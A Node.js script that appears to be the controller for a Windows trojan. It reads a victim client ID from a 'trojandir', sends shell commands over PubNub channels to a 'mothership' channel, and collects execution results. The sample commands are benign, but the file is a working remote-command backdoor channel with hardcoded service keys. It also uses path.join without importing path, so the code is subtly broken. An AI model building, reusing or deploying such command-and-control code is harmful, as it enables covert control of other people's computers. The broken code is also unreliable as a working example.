import PubNub from 'pubnub';
import fs from 'node:fs';
import crypto from 'crypto';

function getRandomCode(n) {
    const min = Math.pow(10, n - 1);
    const max = Math.pow(10, n) - 1;

    return crypto.randomInt(min, max + 1).toString();    
}

function isNullOrWhitespace(str) {
    return !str || !str.trim();
}

function logmsg(msg) {
    console.log(msg);
}

const enginename = 'BAT';
const trojandir = 'C:\\ProgramData\\owd\\';
const clientid = fs.readFileSync(path.join(trojandir, 'client_id'), 'utf8');

let mothership_channel = `clientid_${clientid}_${enginename}_mothership`;
let client_channel = `clientid_${clientid}_${enginename}_client`;

const pubnub = new PubNub({
    publishKey: 'pub-c-a00eaad9-c35e-4a41-bd62-cdc619a6f2cc',
    subscribeKey: 'sub-c-94ed1e1c-a765-4fd9-ba9e-f8ebbb47f5bd',
    userId: 'clientid_'+clientid // Unique identifier for this client
});

const channel = pubnub.channel(client_channel);
const subscription = channel.subscription();

var seqid = 1;
var cmdresponse = null;

var cmdresponses = [];

subscription.onMessage = (messageEvent) => {
    // logmsg("Message event: " + JSON.stringify(messageEvent));
    cmdresponse = messageEvent.message.execresult;
    cmdresponses.push(cmdresponse);
    logmsg(cmdresponse);
};

subscription.subscribe();


function getTimestamp() {
    const date = new Date();
    
    // Extract components
    const year = date.getFullYear();
    const month = String(date.getMonth() + 1).padStart(2, '0'); //
    const day = String(date.getDate()).padStart(2, '0');       //
    const hours = String(date.getHours()).padStart(2, '0');    //
    const minutes = String(date.getMinutes()).padStart(2, '0');//
    const seconds = String(date.getSeconds()).padStart(2, '0');//
    const ms = String(date.getMilliseconds()).padStart(3, '0'); //
  
    // Combine into final strings
    const yyyymmddhhmmss = `${year}${month}${day}${hours}${minutes}${seconds}`;
    const fullWithMs = `${yyyymmddhhmmss}${ms}`;
  
    return fullWithMs;
}

async function sendCmd(cmdtext) {
    
    if ( isNullOrWhitespace(cmdtext) ) {
        return;
    }

    if ( ! cmdtext.endsWith('\n') ) {
        cmdtext += '\n';
    }

    // { cmdtext:'echo 1234 \n', seqid:1234, cmdid:random 8 digit code, ts:timestamp }

    let cmdobj = { 
        cmdtext:cmdtext, 
        seqid:seqid++, 
        cmdid:getRandomCode(8), 
        ts:getTimestamp() 
    };
    
    return publishMessage(cmdobj);
}

async function publishMessage(payload) {
    logmsg('starting');
    
    let res = await pubnub.publish({
        channel: mothership_channel,
        message: payload
    });

    logmsg(JSON.stringify(payload));
    console.log("Success! Timetoken:", res.timetoken);

    logmsg('finished');

    return res;
}

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

function sleepSync(ms) {
    const buffer = new SharedArrayBuffer(4);
    const view = new Int32Array(buffer);
    // Atomics.wait freezes the execution thread until the condition is met or 
    // it times out
    Atomics.wait(view, 0, 0, ms); 
}

var cmds = [];
cmds.push('echo 1234');
cmds.push('echo %DATE%');
cmds.push('echo %TIME%');
cmds.push('dir');

cmds = cmds.toReversed();

for ( let i = 0; i<cmds.length; i++) {
    let cmdtext = cmds[i];
        
    await sendCmd(cmdtext);

    logmsg('waiting 1 second...');
    sleepSync(1000);    
}

while (true) {
    logmsg('looping...');
    sleepSync(1000);    
}